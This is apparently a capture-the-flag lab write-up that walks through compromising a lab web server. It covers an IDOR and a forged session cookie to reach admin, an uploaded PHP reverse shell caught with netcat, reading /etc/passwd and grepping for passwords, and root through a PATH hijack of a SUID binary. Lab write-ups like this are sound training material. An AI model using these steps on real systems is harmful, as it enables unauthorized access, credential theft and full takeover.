## Reconnaissance

![Pasted image 20260917090802](img/Pasted%20image%2020260917090802.png)

## Footprint 

![Pasted image 20260917091133](img/Pasted%20image%2020260917091133.png)

![Pasted image 20260917091812](img/Pasted%20image%2020260917091812.png)
We see link to loging
![Pasted image 20260917091703](img/Pasted%20image%2020260917091703.png)
Login as guest
![Pasted image 20260917091644](img/Pasted%20image%2020260917091644.png)

![Pasted image 20260917092400](img/Pasted%20image%2020260917092400.png)
Uploads tab blocked for now 
![Pasted image 20260917092022](img/Pasted%20image%2020260917092022.png)![Pasted image 20260917092119](img/Pasted%20image%2020260917092119.png)

in url we changed id=2 on id=1 and took admin's info 
![Pasted image 20260917092218](img/Pasted%20image%2020260917092218.png)
![Pasted image 20260917092306](img/Pasted%20image%2020260917092306.png)

F12>Application up tab>Cookies> our server ip and we see id of sessions. Lets change our id on admin's that we took and change role from guest to admin
![Pasted image 20260917093729](img/Pasted%20image%2020260917093729.png)

![Pasted image 20260917094035](img/Pasted%20image%2020260917094035.png)

![Pasted image 20260917094425](img/Pasted%20image%2020260917094425.png)
And reload page 

We took upload menu for root ! 
![Pasted image 20260917094520](img/Pasted%20image%2020260917094520.png)

Now that we got access to the upload form we can attempt to upload a PHP reverse shell. Instead of creating our own one, we will use an existing one. In Parrot OS, it is possible to find webshells under the folder /usr/share/webshells/ , however, if you don't have it, you can download it from here. For this exercise we are going to use the /usr/share/webshells/php/php-reverse-shell.php
But firstly modify for your needs : change on your local ip and port that you will listen 
![Pasted image 20260917112022](img/Pasted%20image%2020260917112022.png)

![Pasted image 20260917112912](img/Pasted%20image%2020260917112912.png)

![Pasted image 20260917111731](img/Pasted%20image%2020260917111731.png)

gobuster dir --url http://10.129.230.77/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php

![Pasted image 20260917110529](img/Pasted%20image%2020260917110529.png)

We see uploads path . We don't have acces but we try take access on downloaded file

But first, we will need to set up a netcat connection: 
nc -lvnp 4444
Then request our shell through the browser:
http://10.129.230.77/uploads/php-reverse-shell.ph

![Pasted image 20260917113027](img/Pasted%20image%2020260917113027.png)
We took succesfully reverse shell 

To make our shell more functionaly we will use 
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![Pasted image 20260917113530](img/Pasted%20image%2020260917113530.png)

## Lateral movement 

We gona follow our  login directory  /var/www/html/cdn-cgi/login to take smthing interesting 

Lets find any data that starts from passw
```
cat * | grep -i passw*
```
![Pasted image 20260917114145](img/Pasted%20image%2020260917114145.png)

We can check avable users in system 
cat /etc/passwd

![Pasted image 20260917114447](img/Pasted%20image%2020260917114447.png)

We see user robert 

![Pasted image 20260917114623](img/Pasted%20image%2020260917114623.png)

Unfortunatly pass not to this user , lets find usefull data from files 

![Pasted image 20260917114759](img/Pasted%20image%2020260917114759.png)

![Pasted image 20260917114914](img/Pasted%20image%2020260917114914.png)

Lets use it. 

![Pasted image 20260917115010](img/Pasted%20image%2020260917115010.png)

We in system , now we will read what in the home folder 

![Pasted image 20260917115342](img/Pasted%20image%2020260917115342.png)

We took flag in user.txt and before we checked that we in common user with no privilegies

## Privilege Escalation

We observe that user robert is part of the group bugtracker . Let's try to see if there is any binary within that group: We found a file named bugtracker .
```
find / -group bugtracker 2>/dev/null
```
We found a file named bugtracker . We check what privileges and what type of file is it:
```
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
```

![Pasted image 20260917120734](img/Pasted%20image%2020260917120734.png)
There is a suid set on that binary, which is a promising exploitation path

> [!NOTE]
> Commonly noted as SUID (Set owner User ID), the special permission for the user access level has a single function: A file with SUID always executes as the user who owns the file, regardless of the user passing the command. If the file owner doesn't have execute permissions, then use an uppercase S here. In our case, the binary 'bugtracker' is owned by root & we can execute it as root since it has SUID set.

![Pasted image 20260917121200](img/Pasted%20image%2020260917121200.png)
The tool trying to output a file using the cat command, and when it doesn't find that file, it displays an error. In the error, it appears as if cat is being referenced without a full path. That means it is relying on the $PATH environment variable in the user's session to find the executable, and we might be able to exploit this in a path hijack attack. 

We will navigate to /tmp directory and create a file named cat with the following content: 
```
/bin/sh
```
We will then set the execute privileges:
```
chmod +x cat
```
In order to exploit this we can add the /tmp directory to the PATH environmental variable. 

![Pasted image 20260917125332](img/Pasted%20image%2020260917125332.png)

> PATH is an environment variable on Unix-like operating systems, DOS, OS/2, and Microsoft Windows, specifying a set of directories where executable programs are located.

We can do that my issuing the following command:
export PATH=/tmp:$PATH

We have root. 

![Pasted image 20260917124844](img/Pasted%20image%2020260917124844.png)

Finally execute the bugtracker from /tmp directory. And we took root flag too. Сat did not work because we replaced it and our script from the /tmp folder is launched through it.

